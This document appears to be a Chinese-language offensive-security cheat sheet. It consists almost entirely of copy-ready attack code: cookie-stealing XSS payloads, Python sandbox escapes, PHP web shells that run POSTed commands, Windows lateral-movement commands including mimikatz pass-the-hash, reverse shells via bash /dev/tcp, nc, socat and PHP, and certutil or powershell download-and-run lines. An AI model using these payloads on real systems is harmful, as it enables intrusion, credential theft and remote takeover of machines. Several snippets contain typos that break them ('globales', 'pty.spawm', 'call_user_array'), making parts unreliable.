<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' onmouseover='alert(/xss/)</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick="alert(/xss/)</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h2><h3 id="python2沙箱逃逸"><a href="#python2沙箱逃逸" class="headerlink" title="python2沙箱逃逸"></a>python2沙箱逃逸</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">71</span>].__init__.globales__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="python3沙箱逃逸"><a href="#python3沙箱逃逸" class="headerlink" title="python3沙箱逃逸"></a>python3沙箱逃逸</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">117</span>].init__.globales[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure></div>



<h2 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $cmd=$_POST[<span class="string">'cmd'</span>];@exec($cmd,$return);var_dump($return);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $last_line = system(<span class="string">"ls"</span>,$retval);<span class="keyword">echo</span> $last_line;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $output = passthru(<span class="string">"ls -la"</span>);<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $output = shell_exec(<span class="string">'ls -la'</span>);<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $fd = popen(<span class="string">"whoami"</span>, <span class="string">'r'</span>);$ret = fgets($fd);<span class="keyword">print</span>($ret);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  $command=$_GET[<span class="string">'a'</span>];</span><br><span class="line">  $wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">  $exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command);</span><br><span class="line">  $stdout = $exec-&gt;StdOut();</span><br><span class="line">  $stdoutput = $stdout-&gt;ReadAll();</span><br><span class="line">  <span class="keyword">echo</span> $stdoutput</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="PHP代码执行"><a href="#PHP代码执行" class="headerlink" title="PHP代码执行"></a>PHP代码执行</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> call_user_func(<span class="string">"assert"</span>,$_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> preg_replace(<span class="string">"/test/e"</span>,$_POST[<span class="string">'cmd'</span>],<span class="string">"just test"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $func = create_function(<span class="string">''</span>,$_POST[<span class="string">'cmd'</span>]);$func;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $cmd=$_POST[<span class="string">'cmd'</span>];$array[<span class="number">0</span>]=$cmd;call_user_array(<span class="string">"assert"</span>,$array);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $cmd=$_POST[<span class="string">'cmd'</span>];$array1=<span class="keyword">array</span>($cmd);$func=$_GET[<span class="string">'func'</span>];array_filter($array1,$func);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $func=$_GET[<span class="string">'func'</span>];$cmd=$_POST[<span class="string">'cmd'</span>];$ayyar[<span class="number">0</span>]=$cmd;$new_array=array_map($func,$array);<span class="keyword">echo</span> $new_array;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:<span class="number">10.10</span>.<span class="number">10.201</span> /user:administrator /password:hetianlab.com <span class="keyword">process</span> call create <span class="string">"cmd.exe /c ipconfig"</span></span><br></pre></td></tr></table></figure></div>

<h3 id="IPC-Schtasks"><a href="#IPC-Schtasks" class="headerlink" title="IPC + Schtasks"></a>IPC + Schtasks</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">10.10</span>.<span class="number">10.201</span>\c<span class="variable">$</span> /user:administrator <span class="string">"hetianlab.com"</span></span><br><span class="line">copy c:\windows\temp\<span class="number">59</span>.exe \\<span class="number">10.10</span>.<span class="number">10.201</span>\c<span class="variable">$</span></span><br><span class="line">schtasks /create /s <span class="number">10.10</span>.<span class="number">10.201</span> /u de1ay\administrator /p <span class="string">"hetianlab.com"</span> /sc MINUTE /mo <span class="number">1</span> /tn test2 /tr <span class="string">"c:\59.exe"</span></span><br><span class="line">schtasks /run /s <span class="number">10.10</span>.<span class="number">10.201</span> /u de1ay\administrator /p <span class="string">"hetianlab.com"</span> /tn test2</span><br><span class="line">schtasks /delete /tn At1 /s <span class="number">10.10</span>.<span class="number">10.201</span> /u administrator /p hetianlab.com</span><br></pre></td></tr></table></figure></div>

<h3 id="IPC-AT"><a href="#IPC-AT" class="headerlink" title="IPC + AT"></a>IPC + AT</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">10.10</span>.<span class="number">10.201</span>\c<span class="variable">$</span> /user:administrator <span class="string">"hetianlab.com"</span></span><br><span class="line">copy <span class="number">59</span>.exe \\<span class="number">10.10</span>.<span class="number">10.201</span>\c<span class="variable">$</span></span><br><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.201</span> <span class="number">19</span>:<span class="number">08</span> c:\<span class="number">59</span>.exe</span><br></pre></td></tr></table></figure></div>

<h3 id="Smbexec"><a href="#Smbexec" class="headerlink" title="Smbexec"></a>Smbexec</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe heetian\Administrator:hetianlab.com@<span class="number">10.10</span>.<span class="number">10.201</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\<span class="number">192.168</span>.<span class="number">10.201</span> <span class="literal">-h</span> heetian\Administrator <span class="literal">-p</span> hetianlab.com <span class="literal">-s</span> cmd.exe <span class="literal">-accepteula</span></span><br></pre></td></tr></table></figure></div>

<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::pth /user:administrator /domain:10.10.10.201 /ntlm:579110c49145015c47ecd267657d3174"</span> <span class="keyword">exit</span></span><br><span class="line">wmiexec.exe <span class="literal">-hashes</span> aad3b435b51404eeaaad3b435b51404ee:<span class="number">579110</span>c49145015c47ecd267657d3174 administrator@<span class="number">10.10</span>.<span class="number">10.201</span> <span class="string">"whoami"</span></span><br><span class="line">smbexec.exe <span class="literal">-hashes</span> aad3b435b51404eeaaad3b435b51404ee:<span class="number">579110</span>c49145015c47ecd267657d3174 administrator@<span class="number">10.10</span>.<span class="number">10.201</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe <span class="literal">-share</span> admin<span class="variable">$</span> administrator:hetianlab.exe@<span class="number">10.10</span>.<span class="number">10.201</span></span><br></pre></td></tr></table></figure></div>



<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/3344 0&gt;&amp;1</span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/192.168.1.1/3344; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure></div>

<h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.1 3344</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.1.1 3344 &gt; /tmp/f</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.1.1",3344);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.1.1 8080 | /bin/bash | telnet 192.168.1.1 9090</span><br></pre></td></tr></table></figure></div>

<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat TCP:192.168.1.1:3344 EXEC:bash</span><br><span class="line">socat TCP:192.168.1.1:3344 EXEC:<span class="string">"bash -li"</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure></div>

<h3 id="获得伪终端"><a href="#获得伪终端" class="headerlink" title="获得伪终端"></a>获得伪终端</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawm("/bin/bash")'</span></span><br></pre></td></tr></table></figure></div>



<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dig @223.5.5.5 hetianlab.com -t A</span><br><span class="line">nslookup hetianlab.com 223.5.5.5</span><br><span class="line">nmap -sn -Pn hetianlab.com --script hostmap-crtsh</span><br><span class="line">whois hetianlab.com</span><br><span class="line"></span><br><span class="line">site:hetianlab.com web</span><br><span class="line">inurl:login</span><br><span class="line">intext:蚁景网安学院</span><br><span class="line">intitle:后台登录</span><br><span class="line">filetype:xls 身份证</span><br></pre></td></tr></table></figure></div>



<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="bitsadmin下载文件"><a href="#bitsadmin下载文件" class="headerlink" title="bitsadmin下载文件"></a>bitsadmin下载文件</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer lan http://<span class="number">192.168</span>.<span class="number">1.2</span>/<span class="number">1</span>.hta C:\temp\<span class="number">1</span>.hta</span><br></pre></td></tr></table></figure></div>

<h3 id="certutil下载文件并执行"><a href="#certutil下载文件并执行" class="headerlink" title="certutil下载文件并执行"></a>certutil下载文件并执行</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">1.2</span>/shell.exe shell.exe &amp; shell.exe</span><br></pre></td></tr></table></figure></div>

<h3 id="certutil清除缓存"><a href="#certutil清除缓存" class="headerlink" title="certutil清除缓存"></a>certutil清除缓存</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">1.2</span>/shell.exe delete</span><br></pre></td></tr></table></figure></div>

<h3 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">"<span class="variable">$p</span>=new-object system.net.webclient;<span class="variable">$p</span>.DownloadFile('http://192.168.1.2/1.hta','1.hta')"</span></span><br><span class="line">powershell.exe (<span class="built_in">new-object</span> system.net.webclient).downloadfile(<span class="string">'http://192.168.1.2/1.hta'</span>,<span class="string">'1.hta'</span>)</span><br><span class="line">powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-uri</span> <span class="string">"http://192.168.1.2/1.hta"</span> <span class="literal">-OutFile</span> <span class="string">"<span class="variable">$env:temp</span>\1.hta"</span></span><br></pre></td></tr></table></figure></div>

<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.2/1.sh</span><br><span class="line">wget -O x.sh http://192.168.1.2/1.sh</span><br></pre></td></tr></table></figure></div>

<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -o x.hta http://192.168.1.2/1.sh</span><br><span class="line">curl -O http://192.168.1.2/1.sh</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'file_put_contents("lan.hta",file_get_contents("http://192.168.1.2/1.sh"));'</span></span><br></pre></td></tr></table></figure></div>

